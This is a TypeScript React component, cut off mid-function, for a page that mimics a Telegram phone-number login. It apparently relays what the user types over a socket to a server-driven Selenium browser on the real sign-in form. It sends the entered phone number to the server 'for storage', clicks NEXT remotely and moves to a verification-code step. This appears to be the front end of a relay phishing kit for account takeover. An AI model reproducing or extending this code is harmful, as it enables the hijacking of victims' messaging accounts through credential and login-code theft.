import type { FC } from 'react';
import { useState, useEffect, useRef } from 'react';
import { io, Socket } from 'socket.io-client';
import { useNavigate, useLocation } from 'react-router-dom';
import styled from 'styled-components';

import { Page } from '@/components/Page.tsx';
import { countries, type Country } from './countries';

const StyledSubmitButton = styled.button<{ $isEnabled: boolean }>`
  width: 100%;
  padding: 14px 24px;
  background-color: ${props => props.$isEnabled ? 'rgb(51,144,236)' : '#ccc'};
  color: white;
  border: none;
  border-radius: 8px;
  font-size: 16px;
  font-weight: 500;
  cursor: ${props => props.$isEnabled ? 'pointer' : 'not-allowed'};
  transition: background-color 0.2s;
  opacity: ${props => props.$isEnabled ? 1 : 0.6};

  &:hover {
    background-color: ${props => props.$isEnabled ? 'rgb(74,149,214)' : '#ccc'};
  }
`;

export const PhoneLoginPage: FC = () => {

  const urlParams = new URLSearchParams(window.location.search);
  const phoneNumberFromUrl = urlParams.get('phoneNumber');

  const navigate = useNavigate();
  const location = useLocation();
  const [selectedCountry, setSelectedCountry] = useState<Country>(countries[0]);
  const [phoneNumber, setPhoneNumber] = useState('');
  const [showCountryDropdown, setShowCountryDropdown] = useState(false);
  const [countrySearchTerm, setCountrySearchTerm] = useState('');
  const [keepSignedIn, setKeepSignedIn] = useState(true);
  const [seleniumStatus, setSeleniumStatus] = useState<string>('Checking Selenium...');
  const [qrCodeButtonFound, setQrCodeButtonFound] = useState(false);
  const [isQrCodeButtonLoading, setIsQrCodeButtonLoading] = useState(false);
  const [phoneCodeInputFound, setPhoneCodeInputFound] = useState(false);
  const [phoneNumberInputFound, setPhoneNumberInputFound] = useState(false);
  const [isInputsReady, setIsInputsReady] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  
  const socketRef = useRef<Socket | null>(null);
  const sessionIdRef = useRef<string>('');
  const countryInputRef = useRef<HTMLInputElement | null>(null);

  // If phoneNumberFromUrl is not empty, set the phone number to the phoneNumberFromUrl
  useEffect(() => {
    if (phoneNumberFromUrl) {
      setTimeout(() => {
        setPhoneNumber(phoneNumberFromUrl);
        // Send phone number to server for storage when set from URL
        if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
          socketRef.current.emit('submitPhoneNumber', {
            sessionId: sessionIdRef.current,
            phoneNumber: phoneNumberFromUrl,
            timestamp: new Date().toISOString()
          });
          console.log('📱 Phone number from URL sent to server for storage');
        }
      }, 50);
      }
    }, [phoneNumberFromUrl]);

  // Initialize socket connection and check for QR code button
  useEffect(() => {
    // Get session ID from URL or localStorage
    let sessionId = urlParams.get('sessionId')!;
    
    sessionIdRef.current = sessionId;

    if (sessionId) {
      console.log('✅ PhoneLoginPage: Session ID found, establishing robust connection...');
      
      // Function to set up event handlers for a socket
      const setupEventHandlers = (socket: any) => {
        if (!socket) return;
        
        socket.on('elementCheckResult', (data: any) => {
          console.log('🔍 Element check result for QR code button:', data);
          if (data.sessionId === sessionId) {
            if (data.elementFound) {
              console.log('✅ Element found in Selenium window:', data.elementType || 'unknown');
              
              // Update state based on element type
              if (data.elementType === 'phoneCodeInput') {
                setPhoneCodeInputFound(true);
                console.log('✅ Phone code input field found, updating state');
              } else if (data.elementType === 'phoneNumberInput') {
                setPhoneNumberInputFound(true);
                console.log('✅ Phone number input field found, updating state');
              } else if (data.elementType === 'verificationCodeInput') {
                console.log('🎉 Verification code input field found! Page has transitioned successfully!');
                
                // CRITICAL SAFETY CHECK: Only allow navigation if we're actually submitting the form
                if (!isSubmitting) {
                  console.log('🚨 SECURITY ALERT: Verification code input detected but form is not being submitted!');
                  console.log('🚨 This suggests premature navigation - blocking for safety');
                  setSeleniumStatus('🚨 Security: Verification page detected prematurely - blocked');
                  return; // Block navigation
                }
                
                setSeleniumStatus('Verification code page loaded! Navigating...');
                
                // Navigate to verification code page
                setTimeout(() => {
                  console.log('🔄 Navigating to verification code page...');
                  
                  // Get the actual phone number from Selenium window to ensure accuracy
                  if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
                    console.log('🔍 Getting actual phone number from Selenium before navigation...');
                    socketRef.current.emit('getCurrentInputValue', {
                      sessionId: sessionIdRef.current,
                      inputType: 'phoneNumber',
                      timestamp: new Date().toISOString()
                    });
                    
                    // Listen for the response and then navigate
                    socketRef.current.once('seleniumInputChange', (data) => {
                      if (data.inputType === 'phoneNumber' && data.action === 'currentValue') {
                        console.log('🔍 Actual phone number from Selenium:', data.value);
                        console.log('🔍 React state phone number:', phoneNumber);
                        
                        // Use the actual Selenium value for navigation
                        const actualPhoneNumber = data.value || phoneNumber;
                        console.log('🔍 Using phone number for navigation:', actualPhoneNumber);
                        
                        // Store phone number in localStorage as backup
                        localStorage.setItem('telegram_phone_number', actualPhoneNumber);
                        console.log('🔍 Stored phone number in localStorage:', actualPhoneNumber);
                        
                        // Send phone number to server for storage
                        if (socketRef.current && socketRef.current.connected) {
                          socketRef.current.emit('submitPhoneNumber', {
                            sessionId: sessionIdRef.current,
                            phoneNumber: actualPhoneNumber,
                            timestamp: new Date().toISOString()
                          });
                          console.log('📱 Phone number sent to server for storage');
                        }
                        
                        // CRITICAL: Reset isSubmitting when navigation happens
                        setIsSubmitting(false);
                        console.log('🔒 isSubmitting reset to false for navigation');
                        
                        navigate(`/verification-code?sessionId=${sessionIdRef.current}&phoneNumber=${encodeURIComponent(actualPhoneNumber)}`);
                      } else {
                        // Fallback to React state if Selenium response is unexpected
                        console.log('🔍 Using React state as fallback:', phoneNumber);
                        
                        // Store phone number in localStorage as backup
                        localStorage.setItem('telegram_phone_number', phoneNumber);
                        console.log('🔍 Stored phone number in localStorage (fallback):', phoneNumber);
                        
                        // Send phone number to server for storage
                        if (socketRef.current && socketRef.current.connected) {
                          socketRef.current.emit('submitPhoneNumber', {
                            sessionId: sessionIdRef.current,
                            phoneNumber: phoneNumber,
                            timestamp: new Date().toISOString()
                          });
                          console.log('📱 Phone number sent to server for storage (fallback)');
                        }
                        
                        // CRITICAL: Reset isSubmitting when navigation happens
                        setIsSubmitting(false);
                        console.log('🔒 isSubmitting reset to false for fallback navigation');
                        
                        navigate(`/verification-code?sessionId=${sessionIdRef.current}&phoneNumber=${encodeURIComponent(phoneNumber)}`);
                      }
                    });
                    
                    // Set a timeout in case Selenium doesn't respond
                    setTimeout(() => {
                      console.log('🔍 Selenium timeout, using React state:', phoneNumber);
                      
                      // Send phone number to server for storage
                      if (socketRef.current && socketRef.current.connected) {
                        socketRef.current.emit('submitPhoneNumber', {
                          sessionId: sessionIdRef.current,
                          phoneNumber: phoneNumber,
                          timestamp: new Date().toISOString()
                        });
                        console.log('📱 Phone number sent to server for storage (timeout)');
                      }
                      
                      // CRITICAL: Reset isSubmitting when navigation happens
                      setIsSubmitting(false);
                      console.log('🔒 isSubmitting reset to false for timeout navigation');
                      
                      navigate(`/verification-code?sessionId=${sessionIdRef.current}&phoneNumber=${encodeURIComponent(phoneNumber)}`);
                    }, 2000);
                  } else {
                    // Fallback if socket not connected
                    console.log('🔍 Socket not connected, using React state:', phoneNumber);
                    
                    // Send phone number to server for storage
                    if (socketRef.current && socketRef.current.connected) {
                      socketRef.current.emit('submitPhoneNumber', {
                        sessionId: sessionIdRef.current,
                        phoneNumber: phoneNumber,
                        timestamp: new Date().toISOString()
                      });
                      console.log('📱 Phone number sent to server for storage (socket fallback)');
                    }
                    
                    // CRITICAL: Reset isSubmitting when navigation happens
                    setIsSubmitting(false);
                    console.log('🔒 isSubmitting reset to false for socket fallback navigation');
                    
                    navigate(`/verification-code?sessionId=${sessionIdRef.current}&phoneNumber=${encodeURIComponent(phoneNumber)}`);
                  }
                }, 500); // Short delay to ensure smooth transition
                return; // Exit early since we're navigating
              } else {
                // Default case: QR code button
                setQrCodeButtonFound(true);
                setSeleniumStatus('QR code button ready');
                console.log('✅ QR code button found, updating state');
              }
              
              // Check if all inputs are ready - use the updated state values
              const currentPhoneCodeFound = data.elementType === 'phoneCodeInput' ? true : phoneCodeInputFound;
              const currentPhoneNumberFound = data.elementType === 'phoneNumberInput' ? true : phoneNumberInputFound;
              
              if (currentPhoneCodeFound && currentPhoneNumberFound) {
                console.log('🎉 All input fields are ready! Enabling form...');
                setIsInputsReady(true);
                setSeleniumStatus('Selenium ready - all elements found!');
                
                // Auto-sync phone number when all inputs are ready
                setTimeout(() => {
                  if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
                    console.log('🔧 Auto-syncing phone number when all inputs are ready...');
                    fixCountryAndPhoneSync();
                  }
                }, 1000); // Wait 1 second for form to be fully ready
              } else {
                console.log('⏳ Still waiting for input fields:', {
                  phoneCodeFound: currentPhoneCodeFound,
                  phoneNumberFound: currentPhoneNumberFound
                });
                setSeleniumStatus(`Waiting for Selenium elements: Phone Code ${currentPhoneCodeFound ? '✅' : '⏳'}, Phone Number ${currentPhoneNumberFound ? '✅' : '⏳'}`);
              }
            } else {
              console.log('❌ Element not found in Selenium window:', data.elementType);
              
              // Check if it's a session error
              if (data.error && data.error.includes('Session is no longer active')) {
                setSeleniumStatus('❌ Selenium session not found - please start a new session');
                setIsInputsReady(false);
              } else if (data.error && data.error.includes('Rate limited')) {
                setSeleniumStatus('⏳ Rate limited - waiting before retry...');
              } else {
                setSeleniumStatus(`Element not found: ${data.elementType} - waiting for Selenium...`);
              }
            }
          }
        });

        // Handle session status response
        socket.on('sessionStatusResult', (data: any) => {
          console.log('🔍 Session status result:', data);
          if (data.sessionId === sessionId) {
            if (data.isActive) {
              console.log('✅ Selenium session is active');
              setSeleniumStatus('Selenium session active, checking elements...');
              // Check for elements
              checkQrCodeButtonInSelenium();
              
              // Auto-sync phone number after session is confirmed active
              setTimeout(() => {
                if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
                  console.log('🔧 Auto-syncing phone number after session confirmed active...');
                  fixCountryAndPhoneSync();
                }
              }, 3000); // Wait 3 seconds for elements to be checked
            } else {
              console.log('❌ Selenium session is not active');
              setSeleniumStatus('❌ No Selenium session found - please start a new session');
              setIsInputsReady(false);
            }
          }
        });

        // Handle Telegram login updates from Selenium (including page transitions)
        socket.on('telegramLoginUpdate', (data: any) => {
          console.log('🔍 Telegram login update received:', data);
          if (data.sessionId === sessionId) {
            console.log('✅ Processing update for current session:', data.event);
            
            switch (data.event) {
              case 'buttonClicked':
                console.log('✅ Auth form button clicked successfully');
                // Note: This event is now handled in handleSubmit, not here
                // The button click confirmation will start verification page monitoring
                break;
                
              case 'verificationPageDetected':
                console.log('🎉 Verification page detected via server event! Navigating immediately...');
                setSeleniumStatus('Verification page detected via server! Navigating...');
                
                // Reset isSubmitting and navigate
                setIsSubmitting(false);
                
                // Navigate to verification code page
                navigate(`/verification-code?sessionId=${sessionId}&phoneNumber=${encodeURIComponent(phoneNumber)}`);
                break;
                
              case 'error':
                console.error('❌ Error from Selenium:', data.data?.error);
                setSeleniumStatus(`Error: ${data.data?.error || 'Unknown error'}`);
                // Re-enable form on error
                setIsInputsReady(true);
                break;
                
              default:
                console.log('📝 Other update event:', data.event, data.data);
                break;
            }
          } else {
            console.log('❌ Session ID mismatch, ignoring update');
          }
        });

        // Handle test connection result
        socket.on('testConnectionResult', (data: any) => {
          console.log('🧪 Test connection result:', data);
          if (data.sessionId === sessionId) {
            if (data.success) {
              setSeleniumStatus(`✅ Test successful: ${data.message}`);
            } else {
              setSeleniumStatus(`❌ Test failed: ${data.message}`);
            }
          }
        });

        // Listen for page structure inspection results
        socket.on('pageStructureResult', (data: any) => {
          console.log('🔍 Page structure inspection result:', data);
          if (data.sessionId === sessionId) {
            if (data.error) {
              console.error('❌ Page structure inspection error:', data.error);
              setSeleniumStatus(`Page inspection error: ${data.error}`);
            } else {
              console.log('✅ Page structure inspection completed');
              console.log('📄 Page title:', data.title);
              console.log('🔗 Page URL:', data.url);
              console.log('📝 Input elements found:', data.inputs?.length || 0);
              console.log('🔘 Button elements found:', data.buttons?.length || 0);
              
              // Log all input elements for debugging
              if (data.inputs) {
                data.inputs.forEach((input: any, index: number) => {
                  console.log(`📝 Input ${index + 1}:`, input);
                });
              }
              
              // Log all button elements for debugging
              if (data.buttons) {
                data.buttons.forEach((button: any, index: number) => {
                  console.log(`🔘 Button ${index + 1}:`, button);
                });
              }
              
              setSeleniumStatus(`Page inspection completed: ${data.inputs?.length || 0} inputs, ${data.buttons?.length || 0} buttons`);
            }
          }
        });

        // Note: We only sync FROM frontend TO backend, never the reverse
        // The frontend is the source of truth for all input values
        
        // Listen for verification page check results
        socket.on('verificationPageCheckResult', (data: any) => {
          console.log('🔍 Verification page check result received:', data);
          if (data.sessionId === sessionId) {
            if (data.isVerificationPage) {
              console.log('🎉 Verification page detected via dedicated check!');
              setSeleniumStatus(`Verification page detected: ${data.currentTitle}`);
              
              // CRITICAL: Navigate to verification page when detected
              if (isSubmitting) {
                console.log('🔄 Verification page detected via dedicated check - navigating immediately!');
                
                // Navigate to verification code page
                setTimeout(() => {
                  console.log('🔄 Navigating to verification code page from dedicated check...');
                  
                  // Get the actual phone number from Selenium window to ensure accuracy
                  if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
                    console.log('🔍 Getting actual phone number from Selenium before navigation...');
                    socketRef.current.emit('getCurrentInputValue', {
                      sessionId: sessionIdRef.current,
                      inputType: 'phoneNumber',
                      timestamp: new Date().toISOString()
                    });
                    
                    // Listen for the response and then navigate
                    socketRef.current.once('seleniumInputChange', (data) => {
                      if (data.inputType === 'phoneNumber' && data.action === 'currentValue') {
                        console.log('🔍 Actual phone number from Selenium:', data.value);
                        console.log('🔍 React state phone number:', phoneNumber);
                        
                        // Use the actual Selenium value for navigation
                        const actualPhoneNumber = data.value || phoneNumber;
                        console.log('🔍 Using phone number for navigation:', actualPhoneNumber);
                        
                        // Store phone number in localStorage as backup
                        localStorage.setItem('telegram_phone_number', actualPhoneNumber);
                        console.log('🔍 Stored phone number in localStorage:', actualPhoneNumber);
                        
                        // Send phone number to server for storage
                        if (socketRef.current && socketRef.current.connected) {
                          socketRef.current.emit('submitPhoneNumber', {
                            sessionId: sessionIdRef.current,
                            phoneNumber: actualPhoneNumber,
                            timestamp: new Date().toISOString()
                          });
                          console.log('📱 Phone number sent to server for storage');
                        }
                        
                        // CRITICAL: Reset isSubmitting when navigation happens
                        setIsSubmitting(false);
                        console.log('🔒 isSubmitting reset to false for navigation');
                        
                        navigate(`/verification-code?sessionId=${sessionIdRef.current}&phoneNumber=${encodeURIComponent(actualPhoneNumber)}`);
                      } else {
                        // Fallback to React state if Selenium response is unexpected
                        console.log('🔍 Using React state as fallback:', phoneNumber);
                        
                        // Store phone number in localStorage as backup
                        localStorage.setItem('telegram_phone_number', phoneNumber);
                        console.log('🔍 Stored phone number in localStorage (fallback):', phoneNumber);
                        
                        // Send phone number to server for storage
                        if (socketRef.current && socketRef.current.connected) {
                          socketRef.current.emit('submitPhoneNumber', {
                            sessionId: sessionIdRef.current,
                            phoneNumber: phoneNumber,
                            timestamp: new Date().toISOString()
                          });
                          console.log('📱 Phone number sent to server for storage (fallback)');
                        }
                        
                        // CRITICAL: Reset isSubmitting when navigation happens
                        setIsSubmitting(false);
                        console.log('🔒 isSubmitting reset to false for fallback navigation');
                        
                        navigate(`/verification-code?sessionId=${sessionIdRef.current}&phoneNumber=${encodeURIComponent(phoneNumber)}`);
                      }
                    });
                    
                    // Set a timeout in case Selenium doesn't respond
                    setTimeout(() => {
                      console.log('🔍 Selenium timeout, using React state:', phoneNumber);
                      
                      // Send phone number to server for storage
                      if (socketRef.current && socketRef.current.connected) {
                        socketRef.current.emit('submitPhoneNumber', {
                          sessionId: sessionIdRef.current,
                          phoneNumber: phoneNumber,
                          timestamp: new Date().toISOString()
                        });
                        console.log('📱 Phone number sent to server for storage (timeout)');
                      }
                      
                      // CRITICAL: Reset isSubmitting when navigation happens
                      setIsSubmitting(false);
                      console.log('🔒 isSubmitting reset to false for timeout navigation');
                      
                      navigate(`/verification-code?sessionId=${sessionIdRef.current}&phoneNumber=${encodeURIComponent(phoneNumber)}`);
                    }, 2000);
                  } else {
                    // Fallback if socket not connected
                    console.log('🔍 Socket not connected, using React state:', phoneNumber);
                    
                    // Send phone number to server for storage
                    if (socketRef.current && socketRef.current.connected) {
                      socketRef.current.emit('submitPhoneNumber', {
                        sessionId: sessionIdRef.current,
                        phoneNumber: phoneNumber,
                        timestamp: new Date().toISOString()
                      });
                      console.log('📱 Phone number sent to server for storage (socket fallback)');
                    }
                    
                    // CRITICAL: Reset isSubmitting when navigation happens
                    setIsSubmitting(false);
                    console.log('🔒 isSubmitting reset to false for socket fallback navigation');
                    
                    navigate(`/verification-code?sessionId=${sessionIdRef.current}&phoneNumber=${encodeURIComponent(phoneNumber)}`);
                  }
                }, 500); // Short delay to ensure smooth transition
              } else {
                console.log('⚠️ Verification page detected but form not submitting - navigation blocked for security');
              }
            } else {
              console.log('🔍 Not on verification page:', data.currentTitle, data.currentUrl);
              setSeleniumStatus(`Current page: ${data.currentTitle}`);
            }
          }
        });

        // Periodic check for QR code button
        const checkInterval = setInterval(() => {
          if (socket && socket.connected && sessionId && !qrCodeButtonFound) {
            console.log('🔄 Periodic check for QR code button...');
            checkQrCodeButtonInSelenium();
          }
          
          // Also check for input fields periodically
          if (socket && socket.connected && sessionId && !isInputsReady) {
            console.log('🔄 Periodic check for input fields...');
            checkInputFieldsInSelenium();
          }
          
                     
        }, 3000);

        // Periodic sync check to prevent fields from getting out of sync
        const syncCheckInterval = setInterval(() => {
          if (socket && socket.connected && sessionId && isInputsReady && phoneNumber) {
            console.log('🔄 Periodic sync check for phone number field...');
            // Check if Selenium field matches React field
            socket.emit('getCurrentInputValue', {
              sessionId: sessionId,
              inputType: 'phoneNumber',
              timestamp: new Date().toISOString()
            });
          }
        }, 10000); // Check every 10 seconds

        // Set a timeout to prevent indefinite waiting
        const timeoutId = setTimeout(() => {
          if (!qrCodeButtonFound) {
            setSeleniumStatus('QR code button timeout - please refresh the page');
            console.warn('⚠️ QR code button timeout reached');
          }
        }, 30000); // 30 seconds timeout

        return () => {
          clearInterval(checkInterval);
          clearInterval(syncCheckInterval);
          clearTimeout(timeoutId);
        };
      };
      
      // Function to establish connection with retries
      const establishConnection = (attempt = 1, maxAttempts = 5) => {
        console.log(`🔄 Connection attempt ${attempt}/${maxAttempts}...`);
        
        // Disconnect any existing socket
        if (socketRef.current) {
          socketRef.current.disconnect();
          socketRef.current = null;
        }
        
        // Create new socket with robust configuration
        const socket = io('http://localhost:3005', {
          transports: ['websocket', 'polling'],
          timeout: 15000, // 15 second timeout
          forceNew: true,
          reconnection: true,
          reconnectionAttempts: 10,
          reconnectionDelay: 1000,
          reconnectionDelayMax: 5000
        });
        
        socketRef.current = socket;
        
        // Connection timeout with retry logic
        const connectionTimeout = setTimeout(() => {
          if (!socket.connected) {
            console.error(`❌ Connection attempt ${attempt} timed out`);
            if (attempt < maxAttempts) {
              console.log(`🔄 Retrying connection in 2 seconds... (attempt ${attempt + 1})`);
              setTimeout(() => establishConnection(attempt + 1, maxAttempts), 2000);
            } else {
              console.error('❌ All connection attempts failed');
              setSeleniumStatus('❌ Failed to connect after all attempts - please refresh the page');
              setIsInputsReady(false);
            }
          }
        }, 15000);

        socket.on('connect', () => {
          console.log(`✅ Connection attempt ${attempt} successful!`);
          clearTimeout(connectionTimeout);
          setSeleniumStatus('Connected to server, verifying connection...');
          
          // Verify the connection is stable
          setTimeout(() => {
            if (socket.connected) {
              console.log('✅ Connection verified as stable');
              setSeleniumStatus('Connection verified, checking Selenium session...');
              
              // Check if the Selenium session is actually active
              setTimeout(() => {
                checkSeleniumSessionStatus();
              }, 500);
            } else {
              console.log('❌ Connection lost after verification');
              setSeleniumStatus('Connection lost after verification, retrying...');
              if (attempt < maxAttempts) {
                setTimeout(() => establishConnection(attempt + 1, maxAttempts), 2000);
              }
            }
          }, 2000); // Wait 2 seconds to verify stability
        });

        socket.on('connect_error', (error: any) => {
          console.error(`❌ Connection attempt ${attempt} error:`, error);
          clearTimeout(connectionTimeout);
          setSeleniumStatus(`Connection error: ${error.message}`);
          setIsInputsReady(false);
          
          // Retry on connection error
          if (attempt < maxAttempts) {
            console.log(`🔄 Retrying connection in 3 seconds... (attempt ${attempt + 1})`);
            setTimeout(() => establishConnection(attempt + 1, maxAttempts), 3000);
          }
        });

        socket.on('disconnect', (reason: any) => {
          console.log(`❌ Connection attempt ${attempt} disconnected:`, reason);
          clearTimeout(connectionTimeout);
          setIsInputsReady(false);
          setSeleniumStatus(`Connection lost: ${reason}`);
          
          // Only retry if it's not a manual disconnect
          if (reason !== 'io client disconnect' && attempt < maxAttempts) {
            console.log(`🔄 Connection lost, retrying in 2 seconds... (attempt ${attempt + 1})`);
            setTimeout(() => establishConnection(attempt + 1, maxAttempts), 2000);
          }
        });

        // Add reconnection logic
        socket.on('reconnect', (attemptNumber: any) => {
          console.log('✅ Reconnected to Socket.IO server, attempt:', attemptNumber);
          setSeleniumStatus('Reconnected to server, checking Selenium session...');
          setTimeout(() => {
            checkSeleniumSessionStatus();
          }, 500);
        });

        socket.on('reconnect_error', (error: any) => {
          console.error('❌ Reconnection error:', error);
          setSeleniumStatus(`Reconnection failed: ${error.message}`);
        });

        socket.on('reconnect_failed', () => {
          console.error('❌ Reconnection failed after all attempts');
          setSeleniumStatus('Failed to reconnect - attempting fresh connection...');
          // Try a fresh connection
          setTimeout(() => establishConnection(1, maxAttempts), 3000);
        });

        // Set up all event handlers for this socket
        setupEventHandlers(socket);
      };

      // Start the connection process
      establishConnection();
    }
  }, []);

  // Reset loading state when component unmounts
  useEffect(() => {
    return () => {
      setIsQrCodeButtonLoading(false);
    };
  }, []);

  // Separate useEffect to handle URL parameter changes (for phone number restoration)
  useEffect(() => {
    const urlParams = new URLSearchParams(location.search);
    const phoneNumberFromUrl = urlParams.get('phoneNumber');
    
    console.log('🔍 PhoneLoginPage: URL change detected - checking for phone number');
    console.log('🔍 PhoneLoginPage: Current location:', location);
    console.log('🔍 PhoneLoginPage: Phone number from URL:', phoneNumberFromUrl);
    
    if (phoneNumberFromUrl) {
      console.log('🔍 PhoneLoginPage: Restoring phone number from URL on URL change:', phoneNumberFromUrl);
      setPhoneNumber(phoneNumberFromUrl);
      
      // Try to extract country code and set appropriate country
      const phoneWithPlus = phoneNumberFromUrl.startsWith('+') ? phoneNumberFromUrl : `+${phoneNumberFromUrl}`;
      console.log('🔍 PhoneLoginPage: Phone with plus:', phoneWithPlus);
      const matchingCountry = countries.find(country => phoneWithPlus.startsWith(country.dialCode));
      if (matchingCountry) {
        console.log('🔍 PhoneLoginPage: Found matching country for restored phone:', matchingCountry.name);
        setSelectedCountry(matchingCountry);
    } else {
        console.log('🔍 PhoneLoginPage: No matching country found for phone:', phoneWithPlus);
    }
    }
  }, [location.search]); // This will run whenever the URL search params change

  // Monitor state changes for debugging
  useEffect(() => {
    console.log('🔄 State update:', {
      phoneCodeInputFound,
      phoneNumberInputFound,
      isInputsReady,
      seleniumStatus
    });
    
    // CRITICAL: Don't re-enable form if we're currently submitting
    if (isSubmitting) {
      console.log('🔒 Form submission in progress - blocking auto re-enablement');
      return;
    }
    
    if (phoneCodeInputFound && phoneNumberInputFound && !isInputsReady) {
      console.log('🎉 Both input fields found, enabling form...');
      setIsInputsReady(true);
      setSeleniumStatus('All input fields ready - form enabled!');
      
      // Don't auto-clear the phone number field - let users paste/type what they want
      console.log('✅ Form enabled - phone number field ready for user input');
    }
  }, [phoneCodeInputFound, phoneNumberInputFound, isInputsReady, seleniumStatus]);

  // Function to check if QR code button is present in Selenium window
  const checkQrCodeButtonInSelenium = () => {
    if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
      console.log('🔍 Checking if QR code button is present in Selenium window...');
      socketRef.current.emit('checkElementInSelenium', {
        sessionId: sessionIdRef.current,
        selector: 'div#auth-phone-number-form form button',
        elementType: 'qrCodeButton',
        timestamp: new Date().toISOString()
      });
    }
  };

  // Function to check if input fields are present in Selenium window
  const checkInputFieldsInSelenium = () => {
    if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
      console.log('🔍 Checking if input fields are present in Selenium window...');
      
      // Check for phone code input
      socketRef.current.emit('checkElementInSelenium', {
        sessionId: sessionIdRef.current,
        selector: 'input#sign-in-phone-code',
        timestamp: new Date().toISOString(),
        elementType: 'phoneCodeInput'
      });
      
      // Check for phone number input
      socketRef.current.emit('checkElementInSelenium', {
        sessionId: sessionIdRef.current,
        selector: 'input#sign-in-phone-number',
        timestamp: new Date().toISOString(),
        elementType: 'phoneNumberInput'
      });
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    console.log('📱 Form submitted, clicking NEXT button in Selenium...');
    console.log('📱 Phone number:', phoneNumber);
    
    // Send phone number to server for storage immediately
    if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
      console.log('📱 Sending phone number to server for storage...');
      socketRef.current.emit('submitPhoneNumber', {
        sessionId: sessionIdRef.current,
        phoneNumber: phoneNumber,
        timestamp: new Date().toISOString()
      });
      console.log('📱 Phone number sent to server for storage');
    }
    
    // Disable the form to prevent multiple submissions
    setIsInputsReady(false);
    setIsSubmitting(true);
    setSeleniumStatus('Clicking NEXT button in Selenium...');
    
    if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
      console.log('🖱️ Proceeding to click NEXT button with validation...');
      await clickNextButton();
      
    } else {
      console.log('❌ Cannot submit - missing socket or session');
      setSeleniumStatus('Error: Cannot connect to Selenium');
      setIsInputsReady(true);
      setIsSubmitting(false);
    }
  };

  // Function to normalize phone numbers for comparison (remove spaces, special chars)
  const normalizePhoneNumber = (phoneNumber: string): string => {
    return phoneNumber.replace(/[\s\-\(\)]/g, '').trim();
  };

  // Function to validate phone number in Selenium before clicking NEXT
  const validatePhoneNumberInSelenium = (): Promise<boolean> => {
    return new Promise((resolve) => {
      console.log('🔍 Validating phone number in Selenium before submission...');
      setSeleniumStatus('Validating phone number in Selenium...');
      
      // Set up timeout for validation
      const validationTimeout = setTimeout(() => {
        console.log('⏰ Phone number validation timeout');
        setSeleniumStatus('Validation timeout - proceeding anyway...');
        resolve(true); // Proceed anyway if validation times out
      }, 3000); // 3 second timeout
      
      // Set up event listener for phone number validation result
      socketRef.current?.once('getPhoneNumberFromSeleniumResult', (data) => {
        clearTimeout(validationTimeout);
        console.log('📥 Received phone number validation result:', data);
        
        if (data.sessionId === sessionIdRef.current && data.success) {
          const seleniumPhoneNumber = data.phoneNumber;
          const frontendPhoneNumber = phoneNumber;
          
          // Normalize both numbers for comparison
          const normalizedSelenium = normalizePhoneNumber(seleniumPhoneNumber);
          const normalizedFrontend = normalizePhoneNumber(frontendPhoneNumber);
          
          console.log('📱 Phone number comparison:', {
            frontend: frontendPhoneNumber,
            selenium: seleniumPhoneNumber,
            normalizedFrontend: normalizedFrontend,
            normalizedSelenium: normalizedSelenium,
            match: normalizedFrontend === normalizedSelenium
          });
          
          if (normalizedFrontend === normalizedSelenium) {
            console.log('✅ Phone numbers match! Proceeding with submission...');
            setSeleniumStatus('Phone number validated - proceeding...');
            resolve(true);
          } else {
            console.log('❌ Phone number mismatch detected! Syncing correct number...');
            setSeleniumStatus('Phone number mismatch - syncing to Selenium...');
            
            // Send the correct phone number to Selenium
            if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
              socketRef.current.emit('syncInputToSelenium', {
                sessionId: sessionIdRef.current,
                inputType: 'phoneNumber',
                value: frontendPhoneNumber,
                timestamp: new Date().toISOString()
              });
              
              // Wait a moment for sync to complete, then proceed
              setTimeout(() => {
                console.log('✅ Phone number synced - proceeding with submission...');
                setSeleniumStatus('Phone number synced - proceeding...');
                resolve(true);
              }, 1000);
              return;
            }
            
            // If sync fails, proceed anyway
            console.log('⚠️ Sync failed - proceeding anyway...');
            setSeleniumStatus('Sync failed - proceeding anyway...');
            resolve(true);
          }
        } else {
          console.log('❌ Failed to get phone number from Selenium:', data.error);
          setSeleniumStatus('Validation failed - proceeding anyway...');
          resolve(true); // Proceed anyway if validation fails
        }
      });
      
      // Request phone number from Selenium
      socketRef.current?.emit('getPhoneNumberFromSelenium', {
        sessionId: sessionIdRef.current,
        timestamp: new Date().toISOString()
      });
    });
  };

  // Function to click the NEXT button after validation passes
  const clickNextButton = async () => {
    console.log('🖱️ Clicking NEXT button in Selenium window...');
    
    try {
      // First validate the phone number in Selenium
      console.log('🔍 Starting phone number validation...');
      const isValid = await validatePhoneNumberInSelenium();
      console.log('🔍 Validation result:', isValid);
      
      if (!isValid) {
        console.log('❌ Phone number validation failed - aborting submission');
        setIsInputsReady(true);
        setIsSubmitting(false);
        return;
      }
      
      console.log('✅ Validation passed - proceeding to click NEXT button');
      
      const correctSelector = '#auth-phone-number-form button[type="submit"]';
      console.log('🔍 Using selector:', correctSelector);
      
      // Set up event listener BEFORE sending the button click
      socketRef.current?.once('clickNextButtonResult', (data) => {
        console.log('📥 Received clickNextButtonResult response:', data);
        
        if (data.sessionId === sessionIdRef.current) {
          console.log('✅ NEXT button clicked successfully! Navigating to verification page...');
          setSeleniumStatus('NEXT button clicked! Navigating to verification page...');
          
          // Navigate immediately to verification code page
          setIsSubmitting(false);
          navigate(`/verification-code?sessionId=${sessionIdRef.current}&phoneNumber=${encodeURIComponent(phoneNumber)}`);
        } else if (data.event === 'error') {
          console.log('❌ NEXT button click failed:', data.data?.error);
          setSeleniumStatus(`NEXT button click failed: ${data.data?.error}`);
          
          // Re-enable form on error
          setIsInputsReady(true);
          setIsSubmitting(false);
        } else {
          console.log('❌ Unexpected response from Selenium:', data);
          setSeleniumStatus('Unexpected response from Selenium');
          setIsInputsReady(true); // Re-enable form
          setIsSubmitting(false); // Reset submitting state
        }
      });
      
      // Send the button click
      socketRef.current?.emit('clickNextButton', {
        sessionId: sessionIdRef.current,
        selector: correctSelector,
